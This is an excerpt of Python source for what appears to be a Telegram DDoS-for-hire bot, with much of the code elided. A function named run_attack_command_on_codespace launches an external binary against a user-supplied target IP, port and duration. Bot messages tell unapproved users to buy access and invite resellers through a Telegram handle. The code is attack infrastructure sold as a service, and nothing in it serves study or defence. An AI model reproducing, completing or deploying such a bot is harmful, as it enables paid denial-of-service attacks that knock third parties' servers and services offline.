...
FORWARD_CHANNEL_ID = -1004698570399
CHANNEL_ID = -1004698570399
error_channel_id = -1004698570399
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./rahul {target_ip} {target_port} {duration}"
    try:
...
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED BUY ACESS:-@Itz_hunt09*", parse_mode='Markdown')
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*FOR RESSELER SHIP DM :-@Itz_hunt09*", parse_mode='Markdown')
